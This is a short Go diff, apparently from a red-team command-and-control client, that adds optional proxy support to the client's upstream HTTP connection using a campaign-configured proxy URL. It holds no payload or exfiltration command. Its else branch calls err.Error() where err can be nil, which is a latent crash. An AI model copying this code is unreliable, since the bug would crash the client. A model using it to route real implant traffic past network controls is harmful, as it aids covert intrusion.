@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"net/url"
 	"time"
 
 	"github.com/dobin/antnium/pkg/model"
@@ -39,6 +40,17 @@ func MakeUpstreamHttp(config *ClientConfig, campaign *model.Campaign) UpstreamHt
 }
 
 func (d *UpstreamHttp) Connect() error {
+	proxyUrl, ok := getProxy(d.campaign)
+	if ok {
+		if proxyUrl, err := url.Parse(proxyUrl); err == nil && proxyUrl.Scheme != "" && proxyUrl.Host != "" {
+			proxyUrlFunc := http.ProxyURL(proxyUrl)
+			http.DefaultTransport.(*http.Transport).Proxy = proxyUrlFunc
+			log.Infof("Using proxy: %s", proxyUrl)
+		} else {
+			log.Warnf("Could not parse proxy %s: %s", proxyUrl, err.Error())
+		}
+	}
+
 	if d.campaign.ClientUseWebsocket {
 		log.Info("UpstreamHttp: Use WS")
 		err := d.notifier.Connect()
